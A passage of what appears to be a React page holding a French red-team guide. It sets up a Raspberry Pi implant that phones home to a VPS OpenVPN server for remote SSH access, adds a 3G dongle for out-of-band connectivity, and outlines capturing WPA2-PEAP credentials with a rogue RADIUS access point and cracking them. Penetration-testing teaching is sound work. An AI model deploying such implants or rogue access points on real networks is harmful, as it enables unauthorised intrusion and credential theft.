Ubuntu)</li>\r\n\r\n          <img id=\"instance\" src={InstanceVPS} alt=\"instance VPS\"/>\r\n\r\n          Une fois crée, Manage -> Networking, ajoutez 2 règles firewall sur les ports (443 et 943)\r\n\r\n          <img id=\"firewall\" src={FirewallRules} alt=\"règle firewall\"/>\r\n\r\n          <li>Installez OpenVPN AS</li>\r\n          <p id=\"terminal\" style={{'text-align':'left'}}>\r\n            # apt update {\"&&\"} apt -y install ca-certificates wget net-tools <br/>\r\n            # wget -qO - https://as-repository.openvpn.net/as-repo-public.gpg | apt-key add - <br/>\r\n            # echo \"deb http://as-repository.openvpn.net/as/debian bionic main\" > /etc/apt/sources.list.d/openvpn-as-repo.list <br/>\r\n            # apt update {\"&&\"} apt -y install openvpn-as <br/>\r\n          </p>\r\n\r\n          <li>Supprimez le profil actuel et configurez OpenVPN:  <strong>/usr/local/openvpn_as/bin/ovpn-init</strong></li>\r\n          <li>Tapez DELETE: (sensible à la casse)</li>\r\n          <li>Finir l'installation comme suit :</li>\r\n        </ol>\r\n        <p id=\"terminal\">Accept EULA: yes <br/>\r\n          Will this be the primary Access Server node: yes <br/>\r\n          Please specify the network interface and IP address to be <br/>\r\n          used by the Admin Web UI: <br/>\r\n          (1) all interfaces: 0.0.0.0 <br/>\r\n          (2) eth0: 45.77.217.54 <br/>\r\n          Réponse: 1 <br/>\r\n          Please specify the port number for the Admin Web UI. <br/>\r\n          Réponse: 943 <br/>\r\n          Please specify the TCP port number for the OpenVPN Daemon <br/>\r\n          Réponse: 443 <br/>\r\n          Should client traffic be routed by default through the VPN? <br/>\r\n          Réponse: YES <br/>\r\n          Should client DNS traffic be routed by default through the VPN? <br/>\r\n          Réponse: YES <br/>\r\n          Use local authentication via internal DB? <br/>\r\n          Pour la suite sélectionnez les réponses par défaut (tapez juste 'Enter') <br/>\r\n          </p>\r\n\r\n          <p>passwd openvpn <br/>\r\n          Changez le mot de passe pour l'utilisateur openvpn.</p>\r\n    \r\n          <br/>\r\n\r\n          <h3>Configuration de OpenVPN AS Server</h3>\r\n          <ol>\r\n            <li>Allez sur https://[IP_Serveur_VPS]:943/admin/</li>\r\n            <li>Se connecter avec le compte <strong>openvpn</strong> et le mot de passe précédemment crée.</li>\r\n            <li>Authentication -> General -> Set to Local (ON) -> Save Settings -> Update Server</li>\r\n            <li>User Management -> User Permissions, créez l'utilisateur <strong>redteam</strong> avec <strong>Set AllowAuto-login</strong></li>\r\n            <li>-> More settings, activez les autorisations : <br/>\r\n            <strong>All server-side private subnets</strong><br/>\r\n            <strong>All other VPN clients</strong></li>\r\n            <li>-> Network settings, indiquer l'adresse publique du VPS</li>\r\n          </ol>\r\n\r\n          <img id=\"publique\" src={PublicIP} alt=\"modification ip publique\"/>\r\n\r\n          <h3>Télécharger les profils OpenVPN</h3>\r\n          <ol>\r\n            <li>Se connecter sur https://[IP_VPS]:943/?src=connect</li>\r\n            <li>Pour chaque utilisateur se connecter et télécharger le profil <strong>Yourself (autologin profile)</strong></li>\r\n          </ol>\r\n\r\n          <img id=\"autologin\" src={AutologinProfile} alt=\"autologin profile\"/>\r\n\r\n          <h3>Configuration de la Raspberry Pi</h3>\r\n          <li>Allumez la Raspberry et branchez un câble ethernet</li>\r\n          <li>Configurez le démarrage automatique d'OpenVPN : <strong>vim /etc/default/openvpn</strong> <br/> et décommentez <strong>[‘AUTOSTART=”all”’]</strong></li>\r\n          <li>Copiez <strong>client.ovpn</strong> sur la Raspberry dans <strong>/etc/openvpn/</strong></li>\r\n          <li>Renommez le en <strong>client.conf</strong></li>\r\n          <li>Activez OpenVPN pour démarrer au boot: <strong>update-rc.d openvpn enable</strong></li>\r\n          <li>Reboot</li>\r\n          \r\n          <br/>\r\n\r\n          <p className=\"tabulation\">Sur OpenVPN AS, Connexions -> Utilisateurs actuels, on voit apparaître l'utilisateur <strong>redteam</strong> avec l'adresse réelle de l'endroit où la Raspberry est branchée et une adresse VPN.</p>\r\n\r\n          <img id=\"redteamuser\" src={RedteamUser} alt=\"connexion utilisateur redteam\"/>\r\n          \r\n          <p className=\"tabulation\"> Nous avons à présent la Raspberry configurée pour se reconnecter au serveur OpenVPN de notre serveur VPS dès qu'elle est connectée à un réseau.</p>\r\n\r\n          <img src=\"https://media.giphy.com/media/x2z9nswqAfpp6/giphy.gif\" alt=\"yatta\"/>\r\n\r\n          <p>Pour avoir un accès à la Raspberry il suffit d'utiliser le même profil vpn à partir de notre VM d'attaque et d'utiliser ssh sur l'adresse IP privée du dessus :</p>\r\n\r\n          <div id=\"terminal\">\r\n            # openvpn --config ./client.ovpn <br/>\r\n            # ssh root@172.27.224.2\r\n          </div>\r\n\r\n          <br/>\r\n          <hr/>\r\n          <br/>\r\n\r\n          <h3>Configuration GSM</h3>\r\n          <p>Lien pour dongle : <a href=\"http://shop.mchobby.be/product.php?id_product=677\">dongle GSM (23,60€)</a>    (module 3G HSDPA, support SMS et connexion internet)</p>\r\n\r\n          <p className=\"tabulation\">Ce module permet d'établir des connexions Internet via le réseau 3G et d'obtenir une connexion là où vous ne disposez pas d'ADSL, de ligne téléphonique classique ou de WiFi.</p>\r\n\r\n          \r\n          <ul>\r\n            <li>Editez le fichier <strong>config.txt</strong> dans le dossier <strong>/boot/</strong></li>\r\n            <li>Ajoutez la ligne suivante: <strong>max_usb_current=1</strong></li>\r\n            <li>Après reboot, branchez la clef USB à la Raspberry</li>\r\n          </ul>\r\n\r\n\r\n          <p>La commande <strong>lsusb</strong> devrait la faire apparaître dans la liste. Sinon vérifiez le matériel et la connectique.</p>\r\n          \r\n          <div id=\"terminal\">\r\n            $ sudo apt-get update<br/>\r\n            $ sudo apt-get install ppp wvdial<br/>\r\n          </div>\r\n\r\n          <h4>Configuration de wvdial</h4>\r\n\r\n          <p>Le fichier de configuration <strong>/etc/wvdial.conf</strong> :</p>\r\n\r\n          <div id=\"terminal\">\r\n          [Dialer Defaults]<br/>\r\n          Init1 = ATZ<br/>\r\n          Init2 = ATQ0 V1 E1 S0=0 {\"&\"}C1 {\"&\"}D2<br/>\r\n          Init3 = AT+CGDCONT=1,\"IP\",\"web.be\"<br/>\r\n          Stupid Mode = 1<br/>\r\n          Modem Type = Analog Modem<br/>\r\n          ISDN = 0<br/>\r\n          New PPPD = yes<br/>\r\n          Phone = *99#<br/>\r\n          Modem = /dev/ttyUSB0<br/>\r\n          Username = web<br/>\r\n          Password = web<br/>\r\n          Baud = 9600\r\n          </div>\r\n\r\n          <p>Les paramètres <strong>web.be</strong> sont des paramètres propres aux opérateurs 3G :<br/><br/>\r\n\r\n          <strong>Pour Mobistar (Orange Belgique)</strong><br/>\r\n          Remplacez web.be par <strong>mworld.be</strong>, (business: entrez web.pro.be)<br/>\r\n          ' Username = '' et ' Password = ''<br/><br/>\r\n\r\n          <strong>Pour Proximus</strong><br/>\r\n          Remplacez web.be par <strong>internet.proximus.be</strong><br/>\r\n          ' Username = '' et ' Password = ''<br/><br/>\r\n\r\n          <strong>Pour Base</strong><br/>\r\n          Remplacez web.be par <strong>gprs.base.be</strong><br/>\r\n          ' Username = 'base' et ' Password = 'base'\r\n          </p>\r\n\r\n          <p className=\"tabulation\">Une fois wvdial configuré, <strong>sudo wvdial</strong> afin de lancer la connexion 3G. Plusieurs informations vont défiler à l'écran dont l'adresse IP publique et les DNS fournis par le FAI. CTRL+C pour couper la connexion, cela affichera alors la durée pendant laquelle la connexion a été maintenue.</p>\r\n\r\n          <br/>\r\n          <hr/>\r\n          <br/>\r\n\r\n          <h3>Contournement authentifiaction radius</h3>\r\n\r\n          <p className=\"tabulation\">Dans les entreprises le WiFi est souvent configuré en <strong>WPA2-PEAP MSCHAPv2</strong>, grâce à sa facilité d’installation dans une infrastructure Windows. La connexion au réseau WiFi se fait alors par une authentification à un <strong>serveur Radius</strong> qui permet aux utilisateurs de l’entreprise de se connecter avec leur compte de domaine.</p>\r\n\r\n          <p className=\"tabulation\">Mais cette configuration est vulnérable à une attaque <strong>MITM</strong> (Man In The Middle) qui permet de récupérer les hashs des mots de passe des utilisateurs. <br/><br/>\r\n          \r\n          Cela consiste à créer un faux serveur Radius qui intercepte les demandes d’authentification à la place du vrai point d’accès, à condition que le serveur de l’attaquant offre un signal plus fort que le vrai point d’accès.</p>\r\n\r\n          <u>La méthodologie à suivre :</u>\r\n\r\n          <ul>\r\n            <li>Mettre en place un faux serveur Radius à l’aide de <strong>hostapd-wpe</strong> configuré avec le même SSID que la cible (ici « Wing Secure ») puis attendre la tentative de connexion d’un utilisateur.</li>\r\n\r\n            <img id=\"radius01\" src={Radius01} alt=\"radius01\"/>\r\n\r\n            <li>Bruteforcer le mot de passe avec <strong>John</strong>, <strong>hashcat</strong> ou avec une attaque par dictionnaire avec <strong>asleap</strong>.</li>\r\n\r\n            <img id=\"radius02\" src={Radius02} alt=\"radius02\"/>\r\n          </ul>\r\n\r\n          <p>On retrouve bien le mot de passe \"<strong>testtest123</strong>\" en quelques secondes avec une wordlist.</p>\r\n\r\n      </div>\r\n      );\r\n    }\r\n  }\r\n\r\n  export default Redteam;  "]},"metadata":{},"sourceType":"module"}